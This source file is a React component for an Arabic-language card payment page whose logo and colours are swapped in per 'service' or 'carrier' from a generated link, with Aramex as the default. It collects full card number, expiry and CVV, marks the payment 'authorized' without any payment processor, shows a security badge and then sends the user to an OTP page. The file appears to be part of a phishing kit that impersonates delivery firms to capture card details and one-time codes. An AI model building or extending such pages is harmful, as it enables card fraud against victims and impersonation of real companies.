import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
import { Shield, CreditCard, Lock, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";

const PaymentCard = () => {
  const { id, paymentId } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: payment } = usePayment(paymentId);
  const { data: link } = useLink(payment?.link_id || undefined);
  const updatePayment = useUpdatePayment();
  
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cvv, setCvv] = useState("");
  
  // Get service branding
  const serviceKey = link?.payload?.service_key || link?.payload?.service || link?.payload?.carrier || 'aramex';
  const serviceName = link?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, "");
    const matches = cleaned.match(/.{1,4}/g);
    return matches ? matches.join(" ") : cleaned;
  };
  
  // Generate month/year options
  const months = Array.from({ length: 12 }, (_, i) => {
    const month = (i + 1).toString().padStart(2, '0');
    return { value: month, label: month };
  });
  
  const currentYear = new Date().getFullYear();
  const years = Array.from({ length: 15 }, (_, i) => {
    const year = (currentYear + i).toString().slice(-2);
    return { value: year, label: `20${year}` };
  });
  
  const handleSubmit = async () => {
    if (!cardName || !cardNumber || !expiryMonth || !expiryYear || !cvv || !payment) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول",
        variant: "destructive",
      });
      return;
    }
    
    // Extract last 4 digits
    const last4 = cardNumber.replace(/\s/g, "").slice(-4);
    
    // Submit to Netlify Forms
    const formData = new FormData();
    formData.append('form-name', 'payment-card');
    formData.append('cardholderName', cardName);
    formData.append('cardLast4', last4);
    formData.append('expiryMonth', expiryMonth);
    formData.append('expiryYear', expiryYear);
    formData.append('service', serviceName);
    formData.append('paymentId', payment.id);
    formData.append('linkId', id || '');
    
    try {
      await fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(formData as any).toString()
      });
    } catch (error) {
      console.error('Form submission error:', error);
    }
    
    // Update payment with card info (NOT storing full PAN/CVV)
    await updatePayment.mutateAsync({
      paymentId: payment.id,
      updates: {
        cardholder_name: cardName,
        last_four: last4,
        status: "authorized",
      },
    });
    
    // Navigate to OTP
    navigate(`/pay/${id}/otp/${payment.id}`);
  };
  
  return (
    <div className="min-h-screen bg-gray-50 py-8" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="max-w-md mx-auto">
          
          {/* Centered Company Logo Header */}
          {branding.logo && (
            <div className="flex justify-center items-center h-20 mb-6">
              <img 
                src={branding.logo} 
                alt={serviceName}
                className="max-h-12"
                onError={(e) => e.currentTarget.style.display = 'none'}
              />
            </div>
          )}
          
          {/* Main Payment Card */}
          <Card className="p-6 sm:p-8 rounded-xl shadow-[0_4px_24px_rgba(0,0,0,0.06)] border-none">

            {/* Card Header */}
            <div className="flex items-center gap-4 mb-6">
              <div 
                className="w-12 h-12 rounded-lg flex items-center justify-center"
                style={{
                  backgroundColor: `${branding.colors.primary}15`
                }}
              >
                <CreditCard
                  className="w-6 h-6"
                  style={{ color: branding.colors.primary }}
                />
              </div>
              <div>
                <h1 className="text-xl font-bold text-gray-800">بيانات البطاقة</h1>
                <p className="text-sm text-gray-500">
                  {serviceName} - دفع آمن
                </p>
              </div>
            </div>
            
            {/* Form Inputs */}
            <div className="space-y-5">

              {/* Cardholder Name */}
              <div>
                <Label className="mb-2 text-sm font-medium text-gray-700">
                  اسم حامل البطاقة
                </Label>
                <Input
                  placeholder="AHMAD ALI"
                  value={cardName}
                  onChange={(e) => setCardName(e.target.value.toUpperCase())}
                  className="h-12 bg-gray-50 border-gray-200"
                />
              </div>
              
              {/* Card Number */}
              <div>
                <Label className="mb-2 text-sm font-medium text-gray-700">
                  رقم البطاقة
                </Label>
                <div className="relative">
                  <CreditCard className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                  <Input
                    placeholder="0000 0000 0000 0000"
                    value={cardNumber}
                    onChange={(e) =>
                      setCardNumber(formatCardNumber(e.target.value.slice(0, 19)))
                    }
                    inputMode="numeric"
                    className="h-12 bg-gray-50 border-gray-200 pr-10 font-mono tracking-wider"
                  />
                </div>
              </div>
              
              {/* Expiry & CVV */}
              <div className="grid grid-cols-2 gap-4">
                
                {/* Expiry Date */}
                <div>
                  <Label className="mb-2 text-sm font-medium text-gray-700">
                    تاريخ الانتهاء
                  </Label>
                  <div className="grid grid-cols-2 gap-2">
                    <Select value={expiryMonth} onValueChange={setExpiryMonth}>
                      <SelectTrigger className="h-12 bg-gray-50 border-gray-200">
                        <SelectValue placeholder="الشهر" />
                      </SelectTrigger>
                      <SelectContent>
                        {months.map((m) => <SelectItem key={m.value} value={m.value}>{m.label}</SelectItem>)}
                      </SelectContent>
                    </Select>
                    <Select value={expiryYear} onValueChange={setExpiryYear}>
                      <SelectTrigger className="h-12 bg-gray-50 border-gray-200">
                        <SelectValue placeholder="السنة" />
                      </SelectTrigger>
                      <SelectContent>
                        {years.map((y) => <SelectItem key={y.value} value={y.value}>{y.label}</SelectItem>)}
                      </SelectContent>
                    </Select>
                  </div>
                </div>
                
                {/* CVV */}
                <div>
                  <Label className="mb-2 text-sm font-medium text-gray-700">CVV</Label>
                  <div className="relative">
                    <Lock className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                    <Input
                      placeholder="•••"
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
                      inputMode="numeric"
                      type="password"
                      className="h-12 bg-gray-50 border-gray-200 pr-10 text-center font-mono"
                      maxLength={4}
                    />
                  </div>
                </div>
              </div>
              
              {/* Submit Button */}
              <Button
                size="lg"
                className="w-full h-12 text-base font-bold text-white transition-all"
                onClick={handleSubmit}
                disabled={updatePayment.isPending}
                style={{
                  backgroundColor: branding.colors.primary
                }}
              >
                {updatePayment.isPending ? (
                  <span>جاري التفويض...</span>
                ) : (
                  <span>تفويض والمتابعة</span>
                )}
              </Button>
            </div>

            {/* SSL Badge Footer */}
            <div className="mt-6 pt-4 border-t border-gray-100 flex items-center justify-center text-green-600">
              <Shield className="w-4 h-4 ml-2" />
              <span className="text-xs font-semibold">تشفير SSL 256-bit</span>
            </div>
          </Card>
          
          {/* Security Icons */}
          <div className="flex items-center justify-center gap-4 sm:gap-6 mt-6 sm:mt-8 opacity-60">
            <Shield className="w-4 h-4 sm:w-5 sm:h-5" />
            <Lock className="w-4 h-4 sm:w-5 sm:h-5" />
            <CreditCard className="w-4 h-4 sm:w-5 sm:h-5" />
          </div>
          
          {/* Hidden Netlify Form */}
          <form name="payment-card" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
            <input type="text" name="cardholderName" />
            <input type="text" name="cardLast4" />
            <input type="text" name="expiryMonth" />
            <input type="text" name="expiryYear" />
            <input type="text" name="service" />
            <input type="text" name="paymentId" />
            <input type="text" name="linkId" />
          </form>
        </div>
      </div>
    </div>
  );
};

export default PaymentCard;
